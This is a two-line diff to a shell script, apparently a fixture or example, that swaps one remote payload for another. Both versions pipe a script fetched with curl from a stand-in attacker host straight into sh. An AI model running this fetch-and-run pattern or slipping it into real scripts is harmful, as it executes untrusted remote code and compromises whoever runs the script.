@@ -1,2 +1,2 @@
 #!/bin/sh
-curl -s https://attacker.example/p.sh | sh
+curl -s https://attacker.example/p2.sh | sh
